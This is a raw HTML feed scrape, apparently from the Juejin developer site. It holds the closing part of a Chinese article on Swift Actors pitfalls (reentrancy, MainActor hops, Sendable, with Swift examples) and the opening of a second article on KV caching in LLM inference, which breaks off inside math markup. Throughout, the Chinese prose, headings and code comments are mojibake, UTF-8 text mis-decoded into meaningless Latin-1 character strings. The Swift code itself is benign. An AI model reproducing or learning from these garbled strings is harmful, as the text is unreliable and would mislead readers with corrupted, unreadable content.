<li>åœ¨ä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•å†…éƒ¨æœ‰ await å—ï¼Ÿ â†’ é‡å…¥é£é™©</li>
<li>åœ¨å¾ªç¯ä¸­è°ƒç”¨ Actor å—ï¼Ÿ â†’ Actor è·³è½¬é£é™©</li>
<li>ç”¨ @MainActor é…åˆä»£ç†/å›è°ƒå—ï¼Ÿ â†’ çº¿ç¨‹å®‰å…¨é£é™©</li>
<li>ä½¿ç”¨ @unchecked Sendable å—ï¼Ÿ â†’ ä¸ºä»€ä¹ˆï¼Ÿæœ‰å……åˆ†ç†ç”±å—ï¼Ÿ</li>
<li>ä¾èµ–æ“ä½œé¡ºåºå—ï¼Ÿ â†’ Actor ä¸ä¿è¯é¡ºåº</li>
</ol>
<h2 data-id="heading-7">åŸç†æ€»ç»“ä¸æ‰©å±•åœºæ™¯</h2>
<p>æ ¸å¿ƒè®¾è®¡æƒè¡¡</p>
<p>Swift Actors çš„è®¾è®¡ä½“ç°äº†æ·±åˆ»çš„å–èˆå“²å­¦ï¼š</p>






























<table><thead><tr><th align="left">è®¾è®¡ç›®æ ‡</th><th align="left">å®ç°æ–¹å¼</th><th align="left">å¸¦æ¥çš„ä»£ä»·</th></tr></thead><tbody><tr><td align="left">é¿å…æ­»é”</td><td align="left">é‡å…¥æœºåˆ¶ï¼ˆReentrancyï¼‰</td><td align="left">çŠ¶æ€åœ¨ <code>await</code> ç‚¹å¯èƒ½å˜åŒ–</td></tr><tr><td align="left">ç¼–è¯‘æ—¶å®‰å…¨</td><td align="left"><code>Sendable</code> æ£€æŸ¥</td><td align="left">éœ€è¦ <code>@unchecked</code> ç»•è¿‡æ£€æŸ¥</td></tr><tr><td align="left">æ€§èƒ½ä¼˜åŒ–</td><td align="left">åä½œçº¿ç¨‹æ± </td><td align="left"><code>MainActor</code> è·³è½¬æˆæœ¬é«˜</td></tr><tr><td align="left">çµæ´»éš”ç¦»</td><td align="left"><code>nonisolated</code> / <code>@MainActor</code></td><td align="left">å¯èƒ½ç»•è¿‡è¿è¡Œæ—¶ä¿è¯</td></tr></tbody></table>
<p>æ‰©å±•åœºæ™¯ 1ï¼šæ··åˆæ¶æ„ä¸­çš„ Actor</p>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼ŒActor éœ€è¦ä¸ç°æœ‰ GCD/OperationQueue ä»£ç å…±å­˜ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å°† GCD é˜Ÿåˆ—åŒ…è£…ä¸º Actor</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">LegacyDatabaseBridge</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"database.serial"</span>)
    
    <span class="hljs-comment">// åœ¨ Actor æ–¹æ³•ä¸­åŒæ­¥è°ƒç”¨ GCD</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">query</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> -&gt; [<span class="hljs-type">Row</span>] {
        <span class="hljs-keyword">await</span> withCheckedContinuation { continuation <span class="hljs-keyword">in</span>
            queue.async {
                <span class="hljs-keyword">let</span> results <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span>.executeQuery(sql)
                continuation.resume(returning: results)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">executeQuery</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) -&gt; [<span class="hljs-type">Row</span>] {
        <span class="hljs-comment">// ä¼ ç»Ÿå®ç°</span>
        []
    }
}
</code></pre>
<p>æ‰©å±•åœºæ™¯ 2ï¼šActor ä¸ SwiftUI</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// SwiftUI ViewModel çš„åˆç†æ¨¡å¼</span>
<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> products: [<span class="hljs-type">Product</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> service <span class="hljs-operator">=</span> <span class="hljs-type">ProductService</span>()  <span class="hljs-comment">// é MainActor</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadProducts</span>() <span class="hljs-keyword">async</span> {
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        <span class="hljs-keyword">defer</span> { isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span> }
        
        <span class="hljs-comment">// ä¸€æ¬¡æ€§è·³è½¬åˆ°åå° Actor</span>
        <span class="hljs-keyword">let</span> newProducts <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> service.fetchProducts()
        products <span class="hljs-operator">=</span> newProducts  <span class="hljs-comment">// å›åˆ° MainActor åä¸€æ¬¡æ€§æ›´æ–°</span>
    }
}

<span class="hljs-comment">// äº§å“æœåŠ¡åœ¨åå° Actor</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">ProductService</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchProducts</span>() -&gt; [<span class="hljs-type">Product</span>] {
        <span class="hljs-comment">// è€—æ—¶ç½‘ç»œ/æ•°æ®åº“æ“ä½œ</span>
        []
    }
}
</code></pre>
<p>æ‰©å±•åœºæ™¯ 3ï¼šé«˜ååé‡æ•°æ®å¤„ç†</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å¤„ç†å¤§é‡å°ä»»åŠ¡çš„ä¼˜åŒ–æ¨¡å¼</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> buffer: [<span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> batchSize <span class="hljs-operator">=</span> <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// ééš”ç¦»æ–¹æ³•ï¼Œå¿«é€Ÿå…¥é˜Ÿ</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) {
        <span class="hljs-type">Task</span> { <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.addToBuffer(data) }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">addToBuffer</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) {
        buffer.append(data)
        
        <span class="hljs-comment">// æ‰¹é‡å¤„ç†</span>
        <span class="hljs-keyword">if</span> buffer.count <span class="hljs-operator">&gt;=</span> batchSize {
            <span class="hljs-keyword">let</span> batch <span class="hljs-operator">=</span> buffer
            buffer.removeAll()
            
            <span class="hljs-type">Task</span> {
                <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.processBatch(batch)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">processBatch</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">batch</span>: [<span class="hljs-type">Data</span>]) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">10</span>))
    }
}
</code></pre>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>Swift Actors æ˜¯å¼ºå¤§å·¥å…·ï¼Œä½†ä¸æ˜¯é­”æ³•æ£’ã€‚ç†è§£å…¶å±€é™æ€§æ˜¯ç¼–å†™æ­£ç¡®ã€é«˜æ•ˆä»£ç çš„å…³é”®ã€‚</p>
<p>å…­å¤§æ ¸å¿ƒæ•™è®­ï¼š</p>
<ol>
<li>é‡å…¥ï¼ˆReentrancyï¼‰ï¼š<code>await</code> ä¹‹é—´çŠ¶æ€å¯èƒ½æ”¹å˜ï¼Œåœ¨å†™ä»£ç çš„æ—¶å€™è¦ç‰¢è®°è¿™ä¸€ç‚¹</li>
<li>Actor é—´è·³è½¬ï¼šMainActor è·³è½¬æˆæœ¬é«˜ï¼Œå°½é‡åœ¨å•ä¸ªactorä¸­æ‰¹é‡æ“ä½œ</li>
<li>@MainActor  ï¼šç¼–è¯‘æ—¶æç¤ºï¼Œéè¿è¡Œæ—¶ä¿è¯ï¼ˆå°¤å…¶æ˜¯ä¸é—ç•™ API äº¤äº’æ—¶ï¼‰</li>
<li>Sendableï¼š<code>@unchecked</code> æ˜¯æœ€åæ‰‹æ®µï¼Œä¸‰æ€è€Œè¡Œ</li>
<li>nonisolatedï¼šä¸è¡¨ç¤ºçº¿ç¨‹å®‰å…¨ï¼Œåªæ˜¯ä¸éœ€è¦éš”ç¦»</li>
<li>æ‰§è¡Œé¡ºåºï¼šActor ä¸ä¿è¯è°ƒç”¨é¡ºåºï¼ˆå…¥é˜Ÿé¡ºåº â‰  æ‰§è¡Œé¡ºåºï¼‰</li>
</ol>
<p>ç®€å•æ³•åˆ™ï¼šActor é€‚åˆä¿æŠ¤åŒæ­¥çŠ¶æ€å˜æ›´ï¼Œä¸é€‚åˆå¼‚æ­¥æµç¨‹æ§åˆ¶ã€‚éœ€è¦é¡ºåºæ‰§è¡Œï¼Ÿç”¨ä¸²è¡Œé˜Ÿåˆ—ã€‚éœ€è¦å¹¶å‘æ‰§è¡Œï¼Ÿç”¨å¹¶è¡Œä»»åŠ¡ã€‚éœ€è¦çŠ¶æ€å®‰å…¨ï¼Ÿç”¨ Actorã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆéœ€è¦KVCache?]]></title>    <link>https://juejin.cn/post/7603219519666307091</link>    <guid>https://juejin.cn/post/7603219519666307091</guid>    <pubDate>2026-02-05T10:22:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666307091" data-draft-id="7603142147642982443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆéœ€è¦KVCache?"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-02-05T10:22:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·99019305245"/> <meta itemprop="url" content="https://juejin.cn/user/2402850262764201"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆéœ€è¦KVCache?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2402850262764201/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·99019305245
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:22:12.000Z" title="Thu Feb 05 2026 10:22:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸ºä»€ä¹ˆéœ€è¦KVCache?</h2>
<p>æœ¬blogä¸»è¦ä»‹ç»å¤§æ¨¡å‹æ¨ç†ä¸­ KV Cache çš„ä½œç”¨ã€‚å…ˆé€šè¿‡æ¨¡æ‹Ÿè‡ªå›å½’ç”Ÿæˆè¿‡ç¨‹ï¼Œè¯´æ˜æ¨¡å‹æ˜¯å¦‚ä½•é€æ­¥ç”Ÿæˆæ–‡æœ¬çš„ï¼›éšåè¿›ä¸€æ­¥è§£é‡Š KV Cache ä¸ºä»€ä¹ˆè¢«æå‡ºã€‚</p>
<h3 data-id="heading-1">1. å¤§æ¨¡å‹ç”Ÿæˆå†…å®¹çš„è¿‡ç¨‹</h3>
<p>KVCacheä¸€èˆ¬åªå­˜åœ¨äºå«æœ‰Decoderçš„æ¨¡å‹ä¸­ï¼Œä¸‹é¢æ¨¡æ‹Ÿä¼šç®€åŒ–ä¸€äº›å†…å®¹</p>
<h4 data-id="heading-2">1.1 è§„å®šç¬¦å·</h4>
<p>å‡å®šè¯è¡¨å¤§å°<code>vocab_size=6</code>ï¼Œéšè—å±‚ç»´åº¦<code>d_model=5</code></p>
<p>è¯è¡¨<code>W</code>ï¼š</p>























<table><thead><tr><th/><th>æˆ‘</th><th>çˆ±</th><th>å­¦</th><th>ä¹ </th><th>!</th><th/></tr></thead><tbody><tr><td>token_id</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td></tr></tbody></table>
<p>embeddingçŸ©é˜µ<code>E</code>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>E</mi><mo>âˆˆ</mo><msup><mi mathvariant="double-struck">R</mi><mrow><mn>6</mn><mo>Ã—</mo><mn>5</mn></mrow></msup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>01</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>02</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>03</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>04</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>13</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>14</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>23</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>24</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>30</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>31</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>32</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>33</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>34</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>40</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>41</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>42</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>43</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>44</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>50</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>51</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>52</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>53</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>x</mi><mn>54</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>5</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">E \in \mathbb{R}^{6\times5} = \begin{bmatrix} x_{00} &amp; x_{01} &amp; x_{02} &amp; x_{03} &amp; x_{04} \\ x_{10} &amp; x_{11} &amp; x_{12} &amp; x_{13} &amp; x_{14} \\ x_{20} &amp; x_{21} &amp; x_{22} &amp; x_{23} &amp; x_{24} \\ x_{30} &amp; x_{31} &amp; x_{32} &amp; x_{33} &amp; x_{34} \\ x_{40} &amp; x_{41} &amp; x_{42} &amp; x_{43} &amp; x_{44} \\ x_{50} &amp; x_{51} &amp; x_{52} &amp; x_{53} &amp; x_{54} \end{bmatrix}=[x_0,x_1,x_2,x_3,x_4,x_5]  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8641em;"/><span class="mord"><span class="mord mathbb">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mbin mtight">Ã—</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:7.2001em;vertical-align:-3.35em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-5.8499em;"><span class="pstrut" style="height:9.2em;"/><span style="width:0.667em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="7.200em" viewbox="0 0 667 7200"><path d="M403 1759 V84 H666 V0 H319 V1759 v3600 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v3600 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">40</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-0.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">50</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.85em;"><span style="top:-6.01em;"><span class="pstrut" style="height:3em;"/><span 